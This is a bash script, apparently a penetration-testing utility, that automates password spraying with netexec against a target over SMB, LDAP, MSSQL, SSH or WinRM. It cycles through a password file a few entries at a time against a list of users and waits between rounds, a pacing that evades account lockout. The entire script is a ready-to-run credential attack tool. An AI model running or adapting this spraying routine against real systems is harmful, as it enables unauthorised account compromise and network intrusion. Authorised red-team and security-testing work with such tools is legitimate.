#!/bin/bash

# Check to ensure all arguments were set
if [[ "$#" != 7 ]]; then
    echo -e "\e[1;31m!!!! INCORRECT NUMBER OF ARGUMENTS, PLEASE CHECK YOUR COMMAND !!!!"
    echo -e "\e[1;36m!!!! Usage: nxc_spray.sh \e[1;32m{protocol (smb,ldap,mssql,ssh,winrm)} \e[0;32m{# of passwords per spray} \e[1;32m{time to wait between sprays} \e[0;32m{user file} \e[1;32m{password file} \e[0;32m{target} \e[1;32m{test run? prints debug only (y/n)}\e[1;36m !!!!\e[0m"
    echo -e "\e[1;36m        Example: $0 smb 4 30 creds/users.txt creds/passw.txt 10.0.0.1 n\e[0m"
    exit 0
fi

######## Variable Conf ########
proto=$1
if ! [[ "$proto" =~ ^(smb|ldap|mssql|ssh|winrm)$ ]]; then
     echo -e "\e[1;31m!!!! INCORRECT PROTOCOL SELECTED, PLEASE USE ONE OF THE FOLLOWING: smb, ldap, mssql, ssh, winrm !!!! \e[0m"
     exit 0
fi
pwcounter=$2 # Number of passwords to spray per cycle
counter=$2 # Used for cycling to next set of passwords
timer="${3}m" # Time to wait between spraying attmepts
users=$4
passwords=$5 # File containing the passwords to spray
totalpasswords=$(($(wc -l $passwords | cut -d " " -f 1)+$pwcounter))
target=$6
testrun=$7
###############################

######## INITIAL DEBUG MSGS ########
echo -e "\e[1;33m######### CONFIGURED PARAMETERS #########\e[0m"
echo -e "\e[33m### Total Passwords: $(wc -l $passwords | cut -d " " -f 1)\e[0m"
echo -e "\e[33m### Timer: $timer\e[0m"
echo -e "\e[33m### User File: $users\e[0m"
echo -e "\e[33m### Password File: $passwords\e[0m"
echo -e "\e[33m### Target: $target \e[0m"
echo -e "\e[33m### Target Protocol: $proto"
echo -e "\e[1;33m#########################################\e[0m"
####################################

while [ $counter -lt $totalpasswords ]
do
    for pass in $(cat $passwords | head -n $counter | tail -n $pwcounter)
        do
            currdate=$(date)
            echo -e "\e[34m=====================================\n### DEBUG Time Launched: $currdate\e[0m"
            echo -e "\e[34m### DEBUG Counter: $counter\e[0m"
            echo -e "\e[34m### DEBUG Password: $pass\e[0m"
            echo -e "\e[34m### DEBUG Command Ran: netexec $proto $target -u $users -p $pass --continue-on-success\e[0m"
	    if [ $testrun == "n"  ]; then
	    	netexec $proto $target -u $users -p $pass --continue-on-success
	    fi
        done
	((counter=$counter+$pwcounter))
        
        # Observation window timer
        sleep $timer
done
